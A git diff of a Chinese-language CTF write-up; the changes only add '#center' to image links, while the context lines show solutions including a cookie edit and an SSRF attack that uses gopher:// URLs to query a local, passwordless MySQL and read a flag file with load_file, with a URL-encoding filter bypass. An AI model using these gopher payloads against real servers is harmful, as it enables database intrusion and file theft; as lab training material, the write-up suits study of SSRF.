@@ -47,7 +47,7 @@ C1CTF{Bash_l1mit3d}
 
 先靠 PIL 把图像给切割了, 如果因为图像太大, 遇到 DecompressionBombError, 可以把 PIL 源码改成 pass 就可以了, 报错是不可能报错的, 这辈子都不可能报错的
 
-![](https://i.loli.net/2019/03/08/5c826d05ce0aa.png)
+![](https://i.loli.net/2019/03/08/5c826d05ce0aa.png#center)
 
 ```python
 from PIL import Image
@@ -117,7 +117,7 @@ for i in range(7569):
 img.save('out.png')
 ```
 
-![](https://i.loli.net/2019/03/08/5c826d603e3ac.png)
+![](https://i.loli.net/2019/03/08/5c826d603e3ac.png#center)
 
 然后你就可以得到这个~
 
@@ -240,9 +240,9 @@ C1CTF{hello_world}
 
 改一下 cookie 就行, 我用的是 [EditThisCookie](https://chrome.google.com/webstore/detail/edit-this-cookie/fngmhnnpilhplaeedifhccceomclgfbg)
 
-![](https://i.loli.net/2019/03/08/5c826dfb50be6.png)  
+![](https://i.loli.net/2019/03/08/5c826dfb50be6.png#center)  
 
-![](https://i.loli.net/2019/03/08/5c826e11a3277.png)  
+![](https://i.loli.net/2019/03/08/5c826e11a3277.png#center)  
 
 ### 0x03 php是世界上最好的语言  
 
@@ -272,13 +272,13 @@ NULL
 
 fuzz 一下 file:// 被过滤了, 然后看了下 HINT. 发现在 info.php 左下角非常猥琐的藏着 sql 语句...
 
-![](https://i.loli.net/2019/03/08/5c826e702af72.png)
+![](https://i.loli.net/2019/03/08/5c826e702af72.png#center)
 
 基本上可以确定是 gopher + ssrf 了
 
 让他访问 http://127.0.0.1:3306 也确实可以得到 mysql 的 banner
 
-![](https://i.loli.net/2019/03/08/5c826e89d5c9b.png)
+![](https://i.loli.net/2019/03/08/5c826e89d5c9b.png#center)
 
 具体原理可以看[这里](https://www.freebuf.com/articles/web/159342.html), 简单来说 gopher 协议可以将任意内容通过 tcp 发送, 而 mysql 在空密码时握手包的内容是固定的, 我们就可以通过 gopher 来读取数据库中的内容
 
@@ -294,7 +294,7 @@ mysql -u root -e "SELECT path FROM ctf.flag" -h127.0.0.1
 
 `gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520083%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql%1A%00%00%00%03SELECT%20path%20FROM%20ctf.flag%01%00%00%00%01`
 
-![](https://i.loli.net/2019/03/08/5c826ec9b4061.png)
+![](https://i.loli.net/2019/03/08/5c826ec9b4061.png#center)
 
 `/var/lib/mysql-files/flag.txt` 即是路径, 再通过 load_file 来读取它
 
@@ -308,13 +308,13 @@ mysql -u root -e "SELECT load_file('/var/lib/mysql-files/flag.txt')" -h127.0.0.1
 
 然后你会得到... 
 
-![](https://i.loli.net/2019/03/08/5c826ef30a8bd.png)
+![](https://i.loli.net/2019/03/08/5c826ef30a8bd.png#center)
 
 太真实了, 再 fuzz 一下, 发现过滤了 file 和 - 字符, 直接 urlencode 一下就可以 bypass, 得到新的 payload 
 
 `gopher://127.0.0.1:3306/A%A4%00%00%01%85%A2%3F%00%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00root%00%00mysql_native_password%00g%03_os%05Linux%0C_client_name%08libmysql%04_pid%0520924%0F_client_version%0710.1.37%09_platform%06x86_64%0Cprogram_name%05mysql2%00%00%00%03SELECT%20load_%66ile%28%27/var/lib/mysql%2dfiles/flag.txt%27%29%01%00%00%00%01`
 
-![](https://i.loli.net/2019/03/08/5c826f0a88582.png)
+![](https://i.loli.net/2019/03/08/5c826f0a88582.png#center)
 
 得到 flag{gopher\_make\_mysql\_happy}
 
